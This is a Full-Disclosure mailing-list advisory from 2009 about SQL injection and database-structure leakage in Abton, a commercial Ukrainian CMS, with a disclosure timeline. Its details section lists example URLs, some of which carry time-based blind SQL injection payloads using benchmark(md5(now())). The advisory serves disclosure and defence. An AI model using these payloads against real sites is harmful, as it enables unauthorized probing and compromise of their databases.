Subject: Vulnerabilities in Abton

Hello Full-Disclosure!

I want to warn you about vulnerabilities in Abton. It's commercial Ukrainian
CMS.

-----------------------------
Advisory: Vulnerabilities in Abton
-----------------------------
URL: http://websecurity.com.ua/2886/
-----------------------------
Timeline:

31.03.2008 - found the vulnerabilities.
16.02.2009 - announced at my site.
17.02.2009 - informed developers.
24.11.2009 - disclosed at my site.
-----------------------------
Details:

These are SQL DB Structure Extraction and SQL Injection vulnerabilities.

SQL DB Structure Extraction:

http://site/rus/details/13220/

http://site/rus/referaty/’/

http://site/rus/’/

http://site/rus/referaty/1/-1/

http://site/abton/

At the site on this engine there are many such vulnerabilities, which lead
to leakage of structure of DB.

SQL Injection:

http://site/rus/details/’+benchmark(10000,md5(now()))+’/

http://site/rus/referaty/1'+benchmark(10000,md5(now()))-’1/

http://site/rus/’+benchmark(10000,md5(now()))+’/

Vulnerable are all versions of Abton before the version where developers
fixed these holes.
